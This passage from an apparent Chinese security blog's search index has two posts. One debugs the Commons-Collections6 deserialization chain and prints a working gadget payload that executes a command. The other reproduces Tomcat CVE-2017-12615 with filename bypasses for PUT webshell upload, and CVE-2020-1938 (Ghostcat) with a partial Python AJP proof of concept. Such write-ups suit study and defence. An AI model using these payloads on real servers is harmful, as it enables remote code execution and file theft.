            <tag> 开发 </tag>
            
            <tag> Elasticsearch </tag>
            
            <tag> java </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>幽默的Commons-Collections6调试</title>
      <link href="/2024/05/14/%E5%B9%BD%E9%BB%98%E7%9A%84Commons-Collections6%E8%B0%83%E8%AF%95/"/>
      <url>/2024/05/14/%E5%B9%BD%E9%BB%98%E7%9A%84Commons-Collections6%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="幽默的Commons-Collections6调试"><a href="#幽默的Commons-Collections6调试" class="headerlink" title="幽默的Commons-Collections6调试"></a>幽默的Commons-Collections6调试</h1><p>事情是在考完期中之后，同学在调式cc6链的时候发现了奇怪问题。</p><p>（下面写的过于详细了。。。）</p><h2 id="问题发现"><a href="#问题发现" class="headerlink" title="问题发现"></a>问题发现</h2><p>（在尝试找出cc6中 为什么LazyMap 最后要使用remove的时候）<br><img src="/img/24-5-14/1.png"><br>就是lazyMap中放的是空的HashMap<br>之前代码并没有向hashMap中写入任何东西，为什么在这里却必须要remove掉’aaa’才能触发链子呢</p><p>于是调试<br><img src="/img/24-5-14/2.png"><br>在创建TiedMapEntry的地方打上断点，跟进<br><img src="/img/24-5-14/3.png"><br>赋值完map的时候还算是正常<br>可是到下一步<br><img src="/img/24-5-14/4.png"><br>参数map的size大小怎么突然由1变成2了？又没有对map进行任何操作<br>这里LazyMap为什么多了且是什么时候多了一个键值对的？<br><img src="/img/24-5-14/5.png"><br>难道后面remove移除的键值对是这个时候添加上去的吗？</p><p>上面发现这个问题的时候，我去翻了翻以前的笔记：<br><img src="/img/24-5-14/6.png"><br>当时其实也是没搞懂，就描述了情况，并没有想明白<br>（好像也是在网上没找到提到过的文章）</p><h2 id="问题调试"><a href="#问题调试" class="headerlink" title="问题调试"></a>问题调试</h2><p>可能对于刚学java反序列化漏洞不久的来说，可能对这种情况就毫无头绪<br>但凭着我对Rome链的学习，得知可能是调试器的问题</p><p>于是调整代码，写入求LazyMap的大小</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span><span class="token class-name">CommonsExp</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Cc6</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">cc6</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> lazyMap<span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"sss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c<span class="token operator">=</span>lazyMap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> factory<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> map2<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>直接运行<br><img src="/img/24-5-14/7.png"><br>那说明，运行的时候并不是我们刚才那个地方写入的LazyMap的<br>而是在后面Hashmap put的时候插入的<br><img src="/img/24-5-14/8.png"></p><p>那我们上面调式的现象又是怎么回事<br>然后，调试到那个方法（构造方法）<br><img src="/img/24-5-14/9.png"><br>还是size还是2<br>运行完：<br><img src="/img/24-5-14/10.png"><br>直接突然说wc，启动调试结果与直接运行结果不一样（：</p><p>根据我之前的经验，这里应该就是调试器的问题，调试器展示对象视图的时候会自动调用对应的toString方法（我猜测就是这个问题）</p><h2 id="问题所在"><a href="#问题所在" class="headerlink" title="问题所在"></a>问题所在</h2><h3 id="真正的写入LazyMap键值对"><a href="#真正的写入LazyMap键值对" class="headerlink" title="真正的写入LazyMap键值对"></a>真正的写入LazyMap键值对</h3><p>运行的时候可以定位到<br><img src="/img/24-5-14/11.png"><br>众所周知，HashMap的put方法会调用key的hashCode方法<br>所以会调用TiedMapEntry#hashCode方法<br><img src="/img/24-5-14/12.png"><br>然后是getValue方法<br><img src="/img/24-5-14/13.png"><br>应为这里的map是LazyMap，<br>看看LazMap#get<br><img src="/img/24-5-14/14.png"><br>应为是map是之前没有赋值的HashMap ,所以一定是走的if里面，这个时候就会把key(‘aaa’) ,value(之前LazyMap中的factoty.transform()) 写入HashMap </p><p>也就是这个时候向LazyMap写入了 ‘aaa’-&gt; …  （LazyMap有这个设定…没有就写入。。。）</p><p>所以若没有remove掉的话，会在反序列化的时候触发最外层HashMap key的hashCode方法就会走到这里。如果map有这个key,就不会走if里面就不会调用transform方法了</p><p>总之是在hashmap.put方法将</p><h3 id="调式时候突然的写入"><a href="#调式时候突然的写入" class="headerlink" title="调式时候突然的写入"></a>调式时候突然的写入</h3><p>直接看TiedMapEntry#toString<br><img src="/img/24-5-14/15.png"><br>这里也会调用getValue与hashCode方法效果一样，<br>LazyMap中没有key,就写入（…）<br>导致会误以为是在构造方法里面就完成的写入</p><p>调试器自动调用toString,所以调式那个方法的时候结果就会改变<br>（idea的抽象）</p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><img src="/img/24-5-14/16.png">设置-&gt;调式器-&gt; 数据视图-&gt; Java 中关闭上面两项设置]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> life </tag>
            
            <tag> cc链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat 漏洞复现集合</title>
      <link href="/2024/05/13/Tomcat-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/"/>
      <url>/2024/05/13/Tomcat-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-漏洞复现集合"><a href="#Tomcat-漏洞复现集合" class="headerlink" title="Tomcat 漏洞复现集合"></a>Tomcat 漏洞复现集合</h1><p><em>Tomcat是常见的web中间间，常用于javaweb</em></p><p>Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。<br>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。<br>诀窍是，当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP 页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能，另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。</p><h2 id="Tomcat-任意文件写入（CVE-2017-12615"><a href="#Tomcat-任意文件写入（CVE-2017-12615" class="headerlink" title="Tomcat 任意文件写入（CVE-2017-12615"></a>Tomcat 任意文件写入（CVE-2017-12615</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li>漏洞简述： 当tomcat启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</li><li>CVE编号：CVE-2017-12615</li><li>影响范围： Tomcat 7.0.0-7.0.81（默认配置）</li></ul><p>当tomcat启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>vulhub启动Tomcat/CVE-2017-12615<br>抓包改成PUT请求<br>访问的是b.jsp/<br>请求体是文件内容<br><img src="/img/24-5-13/1.png"><br>然后get访问<br><img src="/img/24-5-13/2.png"><br>也是成功存在了b.jsp   这样可以上传一个webshell达到命令执行<br>说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 b.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。</p><p>default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。<br>可以看出即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。<br>这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。<br>目前主要两种方法：</p><ul><li>test.jsp::$DATA</li><li>test.jsp%20</li><li>test.jsp/</li></ul><p>利用这两种姿势PUT请求tomcat的时候，骗过tomcat而进入DefaultServlet处理的逻辑。<br>我们构造的payload是put方法，所以直接断点进入了 doput：</p><p>漏洞原理分析：<br><a href="https://yaofeifly.github.io/2017/09/25/tomcat/#3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://yaofeifly.github.io/2017/09/25/tomcat/#3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p><h2 id="文件读取-包含漏洞（CVE-2020-1938）"><a href="#文件读取-包含漏洞（CVE-2020-1938）" class="headerlink" title="文件读取/包含漏洞（CVE-2020-1938）"></a>文件读取/包含漏洞（CVE-2020-1938）</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>  默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0/0）.</p><p><strong>危害</strong><br>攻击者可以读取 Tomcat所有 webapp目录下的任意文件。此外如果网站应用提供文件上传的功能，攻击者可以先向服务端上传一个内容含有恶意 JSP 脚本代码的文件（上传的文件本身可以是任意类型的文件，比如图片、纯文本文件等），然后利用 Ghostcat 漏洞进行文件包含，从而达到代码执行的危害<br><strong>影响范围</strong><br>Apache Tomcat 9.x &lt; 9.0.31<br>Apache Tomcat 8.x &lt; 8.5.51<br>Apache Tomcat 7.x &lt; 7.0.100<br>Apache Tomcat 6.x</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector 且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat 漏洞利用的风险。注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 。<br><strong>原理</strong><br>Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell</p><p>分析：<a href="https://www.51cto.com/article/746415.html">https://www.51cto.com/article/746415.html</a></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span><span class="token comment">#by ydhcui</span><span class="token keyword">import</span> struct<span class="token keyword">from</span> io <span class="token keyword">import</span> StringIO<span class="token comment"># Some references:</span><span class="token comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><span class="token keyword">def</span> <span class="token function">pack_string</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> s <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span><span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;h"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;H%dsb"</span> <span class="token operator">%</span> l<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unpack</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> fmt<span class="token punctuation">)</span><span class="token punctuation">:</span>size <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>buf <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token keyword">return</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unpack_string</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>size<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;h"</span><span class="token punctuation">)</span><span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># null string</span><span class="token keyword">return</span> <span class="token boolean">None</span>res<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"%ds"</span> <span class="token operator">%</span> size<span class="token punctuation">)</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \0</span><span class="token keyword">return</span> res<span class="token keyword">class</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">AjpBodyRequest</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># server == web server, container == servlet</span>SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>MAX_REQUEST_LENGTH <span class="token operator">=</span> <span class="token number">8186</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_stream<span class="token punctuation">,</span> data_len<span class="token punctuation">,</span> data_direction<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>data_stream <span class="token operator">=</span> data_streamself<span class="token punctuation">.</span>data_len <span class="token operator">=</span> data_lenself<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>data_stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>AjpBodyRequest<span class="token punctuation">.</span>MAX_REQUEST_LENGTH<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;bbH"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;H"</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>res <span class="token operator">+=</span> data<span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpBodyRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;bbH"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;bbH"</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> header <span class="token operator">+</span> res<span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>data <span class="token operator">=</span> self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">while</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK <span class="token keyword">and</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token keyword">class</span> <span class="token class-name">AjpForwardRequest</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>_<span class="token punctuation">,</span> OPTIONS<span class="token punctuation">,</span> GET<span class="token punctuation">,</span> HEAD<span class="token punctuation">,</span> POST<span class="token punctuation">,</span> PUT<span class="token punctuation">,</span> DELETE<span class="token punctuation">,</span> TRACE<span class="token punctuation">,</span> PROPFIND<span class="token punctuation">,</span> PROPPATCH<span class="token punctuation">,</span> MKCOL<span class="token punctuation">,</span> COPY<span class="token punctuation">,</span> MOVE<span class="token punctuation">,</span> LOCK<span class="token punctuation">,</span> UNLOCK<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> REPORT<span class="token punctuation">,</span> 